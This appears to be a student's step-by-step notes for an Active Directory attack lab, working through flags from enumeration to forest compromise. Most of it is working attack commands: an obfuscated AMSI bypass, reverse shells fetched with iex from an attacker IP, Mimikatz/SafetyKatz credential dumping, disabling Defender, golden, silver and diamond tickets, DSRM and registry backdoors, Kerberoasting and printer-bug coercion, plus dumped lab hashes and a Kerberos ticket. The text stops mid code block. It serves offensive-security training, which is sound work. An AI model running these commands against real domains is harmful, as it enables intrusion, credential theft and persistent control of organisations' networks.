Start by running Invishell to avoid being detected
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
### **FLAG 1 - SID of the member of the Enterprise Admins group**

Import powerView script
```powershell
. C:\AD\Tools\PowerView.ps1
```
Use the following command to get the SID of the domain users
```Powerview
Get-DomainGroupMember -Identity "Enterprise Admins"
```
But it doesn't return nothing because this computer is not in the root domain. So we need to query the root domain
```powerview
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```
![[Pasted image 20231018115633.png]]

### **FLAG 2 - Display name of the GPO applied on StudentMachines OU**
Task
Enumerate following for the dollarcorp domain:
- List all the OUs
- List all the computers in the StudentMachines OU.
- List the GPOs 
- Enumerate GPO applied on the StudentMachines OU.
*List all the OUs*
Use the command
```powerview
Get-DomainOU
```

*List all the computers in the StudentMachines OU*
We can list all OUs names
```powerview
Get-DomainOU | select -ExpandProperty name
```
![[Pasted image 20231018120557.png]]
and select only the StudenMachines OU name
```PowerView
(Get-DomainOU -Identity StudentMachines).distinguishedname | 
%{Get-DomainComputer -SearchBase $_} | select name
```

*List the GPOs*
Use the command
```powerview
Get-DomainGPO
```

*Enumerate GPO applied on the StudentMachines OU*
Now copy the cn of the student machines with this command
```Powerview
(Get-DomainOU -Identity StudentMachines).gplink
```
![[Pasted image 20231018121132.png]]
And use it to retrieve the StudentMachines GPOs
```powerview
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'
```
![[Pasted image 20231018121240.png]]

### **FLAG 3 - ActiveDirectory Rights for RDPUsers group on the users named ControlxUser**
Enumerate following for the dollarcorp domain:
- ACL for the Domain Admins group
- All modify rights/permissions for the studentx
*ACL for the Domain Admins group*
To get all ACLs
 ```PowerView
Get-DomainObjectAcl
```
To retrieve the ACLs for the Group admin group
```Powerview
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```
*All modify rights/permissions for the studentx*
To find interesting ACLs for user student115 (me)
```powerview
Find-InterestingDomainAcl -ResolveGUIDs |  ?{$_.IdentityReferenceName -match "student115"}
```
To find interesting ACLs for RDPUsers group
```powerview
Find-InterestingDomainAcl -ResolveGUIDs |  ?{$_.IdentityReferenceName -match "RDPUsers"}
```
![[Pasted image 20231018125919.png]]
### **FLAG 4 - Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local**
- Enumerate all domains in the moneycorp.local forest. 
- Map the trusts of the dollarcorp.moneycorp.local domain.
- Map External trusts in moneycorp.local forest. 
- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
*Enumerate all domains in the moneycorp.local forest*
Use the next command
 ```PowerView
Get-ForestDomain
```
![[Pasted image 20231018142754.png]]

*Map the trusts of the dollarcorp.moneycorp.local domain*
 ```PowerView
Get-DomainTrust
```
![[Pasted image 20231018130229.png]]
*Map External trusts in moneycorp.local forest*
To  list only the external trusts int the current forest
```Powerview
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
![[Pasted image 20231018143331.png]]

*Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?*
```Powerview
 Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
![[Pasted image 20231018143757.png]]
enumerate trusts for eurocorp.local forest (Needed bi-directional or on way trust)
```Powerview
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```
![[Pasted image 20231018144327.png]]

### **FLAG 5/6/7/8 - Service Abuse/Lateral movement/Jenkins**
- Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
- Identify a machine in the domain where studentx has local administrative access.
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.
*Exploit a service on dcorp-studentx and elevate privileges to local administrator*
Import PowerUp.ps1
```powershell
. C:\AD\Tools\PowerUp.ps1
```
And launch the enumeration for possible privesc
```PowerUp
Invoke-AllChecks
```
![[Pasted image 20231018145259.png]]
Abuse the service
```PowerUp
Invoke-ServiceAbuse -Name 'AbyssWebServer'
```
or to add ou user to the Local Administrator group
```PowerUp
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student115' -Verbose
```
![[Pasted image 20231018145807.png]]
*Identify a machine in the domain where studentx has local administrative access.*
```powershell
. .\Find-PSremotingLocalAdminAccess.ps1
```
```powershell
Find-PSremotingLocalAdminAccess -verbose
```
![[Pasted image 20231018151010.png]]
Connect to the machine found
```powershell
winrs -r:dcorp-adminsrv cmd
```
*Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server*
If we go to the “People” page of Jenkins we can see the users present on the Jenkins instance. Since Jenkins does not have a password policy many users use username as passwords even on the 
publicly available instances.
In this case `builduser:builduser ` 
Use the modified version of invoke-powershelltcp.ps1 and download with jenkins to run it as the user running jenkils
```powershell
powershell.exe iex (iwr http://172.16.100.115/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.99.115 -Port 443
```
![[Pasted image 20231018153601.png]]

### **FLAG 9 - Collection method in BloodHound that covers all the collection methods**
Launch sharpound on the student vm and export it to kali to use bloodhound
### **FLAG 10/11/12/13/14/15 - svcadmin/NTLM **
- Identify a machine in the target domain where a Domain Admin session is available. 
- Compromise the machine and escalate privileges to Domain Admin
	- Using access to dcorp-ci
	- Using derivative local admin
*Identify a machine in the target domain where a Domain Admin session is available*
First bypass the Enhanced Script Block Logging on the reverse shell
```powershell
iex (iwr http://172.16.100.115/sbloggingbypass.txt -UseBasicParsing)
```
To bypass the AMSI
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
Now download powerview on the reverse shell to enumerate the machines where the domain admin is logged in
```powershell
iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.115/PowerView.ps1'))
```
launch the command
```powerview
Find-DomainUserLocation
```
![[Pasted image 20231018164427.png]]
Connect using winrs
```powershell
winrs -r:dcorp-mgmt whoami
```
![[Pasted image 20231018164816.png]]
*Abuse using winrs*
To extract credentials from the machine we could run safetykatz. To do that we should copy loader.exe on the machine.
```powershell
iwr http://172.16.100.115/Loader.exe -OutFile C:\Users\Public\Loader.exe
```
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```
To avoid detection while download safetykatz add a portforwarding on the remote machine
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115"
```
Launch safety katz
```Powershell
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
![[Pasted image 20231019104347.png]]
==Works only if file is hosted inside the network==
we get svcadmin aes256_hmac, rc4_hmac_nt and password on DCORP-mngm
______
Second Method - Abusing PS-Remoting
Download Invoke-Mimi
```powershell
iex (iwr http://172.16.100.115/Invoke-Mimi.ps1 -UseBasicParsing)
```
Create a session with pssession
```powershell
 $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```
Disable AMSI on the remote machine
```powershell
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```
Run invoke-mimi
```powershell
Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```

`DCORP-DC svcadmin creds`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | \*ThisisBlasphemyThisisMadness!!                                 |
| aes256_hmac | 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 |
| rc4_hmac_nt | b38ff50264b74508085d82c69794a4d8                                 |

Finally we can use the OverPass-the-Hash technique to access on dcorp-dc
```cmd
Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
==With cmd and elevated priviledges==
Use winrs to test
```powershell
winrs -r:dcorp-dc whoami
```
![[Pasted image 20231019111546.png]]
*Derivative Local Admin*
To to user hunting with our priviledge user "Student115"
```powershell
. .\Find-PSRemotingLocalAdminAccess.ps1
```
and the command
```powershell
Find-PSRemotingLocalAdminAccess
```
![[Pasted image 20231019125319.png]]
We have local admin on the dcorp-adminsrv.
To look if there are some restriction on the app we can run check for "applocker" 
```powershell
winrs -r:dcorp-adminsrv cmd
```
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```
is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else
![[Pasted image 20231019143148.png]]
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d2
```
![[Pasted image 20231019143331.png]]
We can also confirm this by using the user dcorp-adminsrv
```powershell
enter-PSSession dcorp-adminsrv
```
```powershell
$ExecutionContext.SessionState.LanguageMode
```
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
So we can run program on the directory C:/Program Files/.
Firstly we disabile de AV
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```
We cannot use the dot sourcing, so we need to use  a script that run mimikatz by itself
```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files
```
```powershell
.\Invoke-MimiEx.ps1
```
`appadmin - DCORP-DC`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | \*ActuallyTheWebServer1                                 |
| aes256_hmac | 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb |
| rc4_hmac_nt | d549831a955fee51a43c83efb3928fa7                                 |

`srvadmin - DCORP-DC`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | null                                |
| aes256_hmac | 145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 |
| rc4_hmac_nt | a98e18228819e8eec3dfa33cb68b0728                                 |

`websvc- DCORP-DC`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | AServicewhichIsNotM3@nttoBe                                      |
| aes256_hmac | 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 |
| rc4_hmac_nt | cc098f204c5887eaa8253e7c2749156f                                 |


### **FLAG 16/17 - hash krbgt/ hash domain administrator**
- Extract secrets from the domain controller of dollarcorp.
- Using the secrets of krbtgt account, create a Golden ticket. 
- Use the Golden ticket to (once again) get domain admin privileges from a machine.
*Extract secrets from the domain controller of dollarcorp*
Now that we had extracted a domain admin's hash we can dump the secrets from a domain controller
First we get a session on the controller
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Copy the loader on the dc and use the port forwarding technique to use mimikatz and extract all creds
```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```
```powershell
winrs -r:dcorp-dc cmd
```
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115
```
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```
```mimikatz
lsadump::lsa /patch
```
![[Pasted image 20231023111808.png]]
or
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

`Administrator- DCORP-DC`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | null                                      |
| NTLM | af0686cc0ca8f04df42210c9ac980760 |

`krbtgt - DCORP-DC`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | null                                      |
| NTLM | 4e9815869d2090ccfca61c1fe0d23986 |
| aes256_hmac | 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 |

`sqladmin - DCORP-DC`

| Type        | Hash                                                             |
| ----------- | ---------------------------------------------------------------- |
| Password    | null                                      |
| NTLM | 07e8be316e3da9a042a9cb681df19bf5 |

`dcorp-dc$ - DCORP-DC`

| Type     | Hash                             |
| -------- | -------------------------------- |
| Password | null                             |
| NTLM     | 1698fafb9170e4798e43b77ac38cf0bf |
| aes256_hmac | 5a056ff3f077232cfa8fee8d7054abb72f99f3c5a04bb46b6c6ae01964414d19 |


*Using the secrets of krbtgt account, create a Golden ticket*
Just use BetterSafetyKatz
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
![[Pasted image 20231023113432.png]]
To check if we succesfully got the golden ticket
```powershell
klist
```
![[Pasted image 20231023113613.png]]

### **FLAG 18 - The service whose Silver Ticket can be used for scheduling tasks**
Try to get command execution on the domain controller by creating silver ticket for: 
- HOST service
- WMI

*HOST service*
Create the golden ticket
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-19815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /aes256:5a056ff3f077232cfa8fee8d7054abb72f99f3c5a04bb46b6c6ae01964414d19 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
Modify Invoke-PowerShellTcp.ps1. Paste and the end of the file the following line
```
Power -Reverse -IPAddress 172.16.100.115 -Port 443
```
And launch this command to inject a shedule task on the host and gain a reverse shell
```powershell
schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "User115" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.115/Invoke-PowerShellTcpEx.ps1''')'"
```

### **FLAG 19 - Name of the account who secrets are used for the Diamond Ticket attack**
- Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack
Use Rubeus and the krbtgt credentials to create a Diamond Ticket
```Cmd
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
and now you can user win-rs to execute commands
### **FLAG 20 - Name of the Registry key modified to change Logon behavior of DSRM administrator**
To persistence on dcorp-dc we can abuse the DSRM service.
Firtsly dump the hashes from the dc
Open a session on the dc
```powershell
. C:\AD\Tools\Invoke-Mimi.ps1
```
```powershell
Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"'
```
or using Rubeus
```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Launch Invishell e establish the session
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```powershell
$sess = New-PSSession dcorp-dc
```
Bypass the AMSI
```powershell
Enter-PSSession -Session $sess
```
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
```powershell
exit
```
Load and launch Invoke-Mimi
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```
```powershell
Enter-PSSession -Session $sess
```
```powershell
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
```
![[Pasted image 20231025114637.png]]
`Local built-in Administrator -dcorp-dc`

|Type|Hash|
|---|---|
|Password|null|
|NTLM|a102ad5753f4c441e3af31c97fad86fd|
|aes256_hmac|null|

The DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
![[Pasted image 20231025115059.png]]
Now from the attack box we can simply pas the hash and use the dsrm administrator session
```powershell
Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```
```powershell
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```
![[Pasted image 20231025115506.png]]


### **FLAG 21 - Attack that can be executed with Replication rights (no DA privileges required)**
- Check if studentx has Replication (DCSync) rights.
- If yes, execute the DCSync attack to pull hashes of the krbtgt user.
- If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user
*Check if studentx has Replication (DCSync) rights.*
We can check with this command
```powershell
. C:\AD\Tools\PowerView.ps1
```
```powerview
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student115"}
```
It doesn't return nothing, so we don't have priviledge
*add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user*
Create a session with a domain admin
```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Run invishell and import powerview
```cmd
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```powershell
. C:\AD\Tools\PowerView.ps1
```
add the permission to student115 
```powerview
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student115 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
![[Pasted image 20231025125006.png]]
Let's check if now we have the permissions (use the previous command)
![[Pasted image 20231025125252.png]]
*execute the DCSync attack to pull hashes of the krbtgt user*
Now use safetykatz to extract the hash of any user
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
![[Pasted image 20231025125418.png]]

### **FLAG 22 - SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace.**
- Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
- Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
*Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access*
Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges.
Open a session with invoke-mimi or rubeus and launch invishell.
import the RACE.ps1 module
```powershell
. C:\AD\Tools\RACE.ps1
```
And modify the service
```powershell
Set-RemoteWMI -SamAccountName student115 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
![[Pasted image 20231025144401.png]]
Now we granted the acces to us
```powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```
![[Pasted image 20231025144606.png]]
___
We can do the same but with powershell. After opened the session and imported
```powershell
. C:\AD\Tools\RACE.ps1
```
```powershell
Set-RemotePSRemoting -SamAccountName student115 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```
To check if the command worked
```powershell
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
![[Pasted image 20231025145545.png]]
*Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI*
To retrieve access without Domain admin access we need to modify a permission on the dc
So open a session, import race.ps1 and launche te command.
```powershell
. C:\AD\Tools\RACE.ps1
```
```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student115 -Verbose
```
![[Pasted image 20231025150802.png]]
and retrieve the hash
```powershell
. C:\AD\Tools\RACE.ps1
```
```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```
![[Pasted image 20231025150902.png]]
and with that we can create a silver ticket for the services (in this case HOST)
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1698fafb9170e4798e43b77ac38cf0bf /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

### **FLAG 23 - SPN for which a TGS is requested**
- Using the Kerberoast attack, crack password of a SQL server service account.
Import powerview and use it to search for spn accounts
```powerview
Get-DomainUser -SPN
```
![[Pasted image 20231025153253.png]]
We try to kerberoast it 
```cmd
C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
![[Pasted image 20231025154546.png]]
Crack it with john
```cmd
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

### **FLAG 24/25 - Domain user who is a local admin on dcorp-appsrv**
- Find a server in the dcorp domain where Unconstrained Delegation is enabled. 
- Compromise the server and escalate to Domain Admin privileges. 
- Escalate to Enterprise Admins privileges by abusing Printer Bug!
*Find a server in the dcorp domain where Unconstrained Delegation is enabled.*
Using powerview we can look for unconstrained delegation server
```powerview
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```
![[Pasted image 20231025161708.png]]
Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. We already pwned on of those user (appadmin)
*Compromise the server and escalate to Domain Admin privileges*
We can try with the user already found gain a session on this server
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
```
One we are logged in we can launch invishell.
Import the Find-PSRemotingLocalAdminAccess.ps1 module to see if we can log in the server

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```
```powershell
Find-PSRemotingLocalAdminAccess
```
![[Pasted image 20231025162212.png]]
Use rubeus on the server to run on listener mode
```powershell
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
```
log in the server
```powershell
winrs -r:dcorp-appsrv cmd
```
Launch rubeus
```powershell
C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
![[Pasted image 20231025163953.png]]
Now use MS-RPRN to force authentication from dcorp-dc$(Machine account)
```powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
Rubeus is triggered
![[Pasted image 20231025164204.png]]
Copy the ticket and use it with rubeus on the local machine
```powershell
C:\AD\Tools\Rubeus.exe ptt /ticket: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
```
![[Pasted image 20231025164640.png]]
And launch safetykatz to dcsync
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

*Escalate to Enterprise Admins privileges by abusing Printer Bug!*
We need to do the same thing with the Rubeus monitoring
```powershell
winrs -r:dcorp-appsrv cmd
```
```powershell
C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```
And now we triggher the authentication from mcorp-dco dcorp-appsrv
```powershell
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
![[Pasted image 20231025165834.png]]
Use rubeus to import the ticket locally
```powershell
